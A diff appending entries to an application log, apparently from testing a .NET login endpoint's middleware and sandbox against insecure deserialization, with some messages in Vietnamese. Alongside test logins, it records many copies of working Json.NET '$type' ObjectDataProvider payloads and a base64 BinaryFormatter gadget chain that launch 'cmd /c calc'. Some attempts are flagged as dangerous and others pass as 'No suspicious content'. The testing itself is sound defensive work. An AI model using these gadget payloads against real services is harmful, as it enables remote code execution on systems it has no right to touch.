@@ -457,3 +457,1668 @@ password after processing: i٢�]�
     "password": "1"
 }
 2025-06-20 16:47:16: Phát hiện base64 dài: 2992 ký tự
+2025-06-22 08:14:35: Middleware read payload: {"Username":"admin","Password":"admin123"}
+2025-06-22 08:14:35: Sandbox received payload: {"Username":"admin","Password":"admin123"}
+2025-06-22 08:14:35: No suspicious content, returning original payload
+2025-06-22 08:14:35: Raw JSON: {"Username":"admin","Password":"admin123"}
+2025-06-22 08:14:35: Username: admin, Password: admin123
+2025-06-22 08:15:31: Middleware read payload: {
+  "username": "testuser", 
+  "password": "testpass"  
+}
+2025-06-22 08:15:31: Sandbox received payload: {
+  "username": "testuser", 
+  "password": "testpass"  
+}
+2025-06-22 08:15:31: No suspicious content, returning original payload
+2025-06-22 08:15:31: Raw JSON: {
+  "username": "testuser", 
+  "password": "testpass"  
+}
+2025-06-22 08:15:31: Username: testuser, Password: testpass
+2025-06-22 08:21:58: Raw JSON: {"Username":"admin","Password":"admin123"}
+2025-06-22 08:21:58: Username: admin, Password: admin123
+2025-06-22 08:22:29: Raw JSON: {
+  "username": "dXNlcm5hbWU=", 
+  "password": "cGFzc3dvcmQ="  
+}
+2025-06-22 08:22:29: Username: dXNlcm5hbWU=, Password: cGFzc3dvcmQ=
+2025-06-22 08:23:44: Raw JSON: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 08:23:44: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-22 08:23:45: Username: , Password: dummy
+2025-06-22 08:24:41: Raw JSON: {
+    "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
+    "password": "1"
+}
+2025-06-22 08:24:41: Username: AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL, Password: 1
+2025-06-22 09:08:35: Raw JSON: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 09:08:36: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-22 09:08:36: Username: , Password: dummy
+2025-06-22 09:15:26: Raw JSON: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 09:15:27: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-22 09:15:27: Username: , Password: dummy
+2025-06-22 09:15:41: Raw JSON: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-22 09:15:41: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-22 09:15:41: Username: , Password: dummy
+2025-06-22 09:18:51: Raw JSON: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 09:18:51: Deserialized dangerous object: {
+  "MethodName": "Start",
+  "MethodParameters": {
+    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+    "$values": [
+      "cmd",
+      "/c calc"
+    ]
+  },
+  "ObjectInstance": {
+    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+  }
+}
+2025-06-22 09:18:51: Username: , Password: dummy
+2025-06-22 09:23:18: Raw JSON: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 17:48:15: Middleware read payload: 
+2025-06-22 17:48:15: Sandbox received payload: 
+2025-06-22 17:48:15: Sandbox error: Error reading JObject from JsonReader. Path '', line 0, position 0.
+2025-06-22 17:50:50: Middleware read payload: 
+2025-06-22 17:50:50: Sandbox received payload: 
+2025-06-22 17:50:50: Sandbox error: Error reading JObject from JsonReader. Path '', line 0, position 0.
+2025-06-22 17:51:29: Middleware read payload: 
+2025-06-22 17:51:29: Sandbox received payload: 
+2025-06-22 17:51:29: Sandbox error: Error reading JObject from JsonReader. Path '', line 0, position 0.
+2025-06-22 18:02:23: Middleware read payload: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 18:02:23: Sandbox received payload: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 18:02:23: No suspicious content, returning original payload
+2025-06-22 18:02:23: Raw JSON: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 18:02:24: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-22 18:02:24: Username: , Password: dummy
+2025-06-22 18:03:19: Middleware read payload: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 18:03:19: Sandbox received payload: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-22 18:03:19: No suspicious content, returning original payload
+2025-06-22 18:04:04: Raw JSON: {
+  "Username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c calc"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "Password": "dummy"
+}
+2025-06-23 14:38:09: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 14:38:09: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 14:38:09: No suspicious content, returning original payload
+2025-06-23 14:38:09: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 14:38:09: Username: admin, Password: admin123
+2025-06-23 14:38:13: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 14:38:13: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 14:38:13: No suspicious content, returning original payload
+2025-06-23 14:38:13: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 14:38:13: Username: admin, Password: admin123
+2025-06-23 14:38:19: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 14:38:19: Phát hiện $type: System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
+2025-06-23 14:40:54: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 14:41:06: Phát hiện $type: System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
+2025-06-23 14:47:11: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 14:47:14: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 15:08:52: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 15:09:13: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 15:09:14: No suspicious content, returning original payload
+2025-06-23 15:10:39: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 15:11:04: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 15:13:29: No suspicious content, returning original payload
+2025-06-23 15:14:57: Raw JSON: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 15:15:22: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-23 15:15:23: Username: , Password: dummy
+2025-06-23 15:52:30: Middleware read payload: {
+    "username": {
